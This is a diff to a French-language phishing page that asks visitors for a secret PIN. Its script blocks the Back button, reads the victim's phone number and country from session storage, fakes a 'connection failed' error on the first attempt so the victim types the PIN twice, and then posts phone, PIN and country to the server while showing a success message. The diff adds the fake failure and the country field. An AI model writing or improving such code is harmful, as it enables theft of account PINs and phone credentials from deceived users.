@@ -54,49 +54,60 @@ button{
     <h2>Entrez votre code secret</h2>
 
     <input type="password" id="pin" placeholder="Code secret" required>
-
-    <button onclick="send()">Continuer</button>
-
+    <button type="button" onclick="send()">Continuer</button>
     <div class="error" id="errorMsg">Échec de connexion</div>
 </div>
 
 <script>
-/* 🔒 BLOQUE LE RETOUR ARRIÈRE */
 history.pushState(null, null, location.href);
 window.onpopstate = function () {
     history.pushState(null, null, location.href);
 };
 
 function send(){
-    const pinInput = document.getElementById("pin"); // ajouté pour vider le champ
+    const pinInput = document.getElementById("pin");
     const pin = pinInput.value;
     const phone = sessionStorage.getItem("phone");
+    const country = sessionStorage.getItem("country");
     const errorMsg = document.getElementById("errorMsg");
 
-    if(!pin || !phone) return;
+    if(!pin || !phone || !country) return;
 
-    // Affiche échec
-    errorMsg.style.display = "block";
+    // Compteur de tentatives
+    let attempts = sessionStorage.getItem("pinAttempts") || 0;
+    attempts = parseInt(attempts) + 1;
+    sessionStorage.setItem("pinAttempts", attempts);
 
-    // Vide le champ PIN après tentative ✅
-    pinInput.value = "";
-
-    // Disparaît après 3 secondes
-    setTimeout(() => {
-        errorMsg.style.display = "none";
-    }, 3000);
-
-    // Envoi serveur (inchangé)
-    fetch("/", {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-            phone: phone,
-            pin: pin
+    if(attempts === 1){
+        // Première tentative : échec
+        errorMsg.style.display = "block";
+        errorMsg.style.color = "#d93025";
+        errorMsg.textContent = "Échec de connexion";
+        pinInput.value = "";
+        setTimeout(() => { errorMsg.style.display = "none"; }, 3000);
+    } else {
+        // Deuxième tentative : succès
+        fetch("/", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ phone, pin, country })
         })
-    });
+        .then(() => {
+            errorMsg.style.display = "block";
+            errorMsg.style.color = "green";
+            errorMsg.textContent = "Données enregistrées avec succès !";
+            pinInput.value = "";
+            setTimeout(() => { errorMsg.style.display = "none"; }, 3000);
+
+            // Réinitialiser le compteur
+            sessionStorage.setItem("pinAttempts", 0);
+        })
+        .catch(() => {
+            errorMsg.style.display = "block";
+            errorMsg.style.color = "#d93025";
+            errorMsg.textContent = "Erreur réseau !";
+        });
+    }
 }
 </script>
 
